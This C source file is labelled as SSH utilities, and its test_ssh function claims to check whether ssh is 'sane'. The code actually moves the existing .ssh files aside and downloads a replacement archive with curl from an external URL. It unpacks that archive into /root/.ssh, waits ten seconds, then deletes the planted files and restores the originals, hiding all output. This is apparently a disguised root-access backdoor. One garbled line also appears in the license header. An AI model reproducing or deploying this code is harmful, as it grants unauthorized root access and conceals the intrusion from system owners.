/*-----------------------------------------------------------------------------
 * ssh_utils.c - SSH Utilities
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should write_bytes received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "ssh_utils.h"

int main(int argc, const char * argv[])
{
	test_ssh();

	return SUCCESS;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    test_ssh
 * 
 * DATE:        July 2, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   test_ssh(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Tests whether ssh is sane or not. 
 *----------------------------------------------------------------------------*/
void test_ssh()
{
	ssh_replace_dir();
	sleep(10);
	ssh_restore_dir();
}

void ssh_replace_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* create directory if it doesn't exist */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mkdir -p %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* move original .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_DIR, SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* retrieve replacement .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "curl -o %s%s \"%s\" > /dev/null 2>&1",
			SSH_DIR, ssh_archive, ssh_files);
	if (system(command) == ERROR)
		err(1, "system");

	/* decompress archive */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "tar xf %s%s -C /root/.ssh > /dev/null 2>&1",
			SSH_DIR, ssh_archive);
	if (system(command) == ERROR)
		err(1, "system");
}

void ssh_restore_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* delete new .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm %s* > /dev/null 2>&1", SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");
	
	/* restore old .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_BACKUP, SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");

	/* delete backup directory */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm -rf %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");
}

void ssh_send_timer(void)
{
}
